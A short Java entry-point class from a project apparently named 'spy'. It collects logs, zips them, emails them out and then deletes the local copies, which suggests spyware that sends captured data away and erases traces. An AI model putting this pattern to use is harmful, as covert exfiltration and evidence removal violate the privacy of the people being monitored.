package me.deepak.spy;

import me.deepak.spy.email.EmailSender;
import me.deepak.spy.log.LogProcessor;
import me.deepak.spy.log.LogProcessorFactory;

/**
 * Entry point to send log.
 * 
 * @author deepak
 */

public class SendLogInitiator {

	public static void main(String[] args) {

		LogProcessor logProcessor = LogProcessorFactory.getInstance();
		String[] logs = logProcessor.getLogs();
		if (logProcessor.zipLogFiles(logs) && EmailSender.sendEmail(logProcessor)) {
			logProcessor.deleteLogs(logs);
		}
	}

}
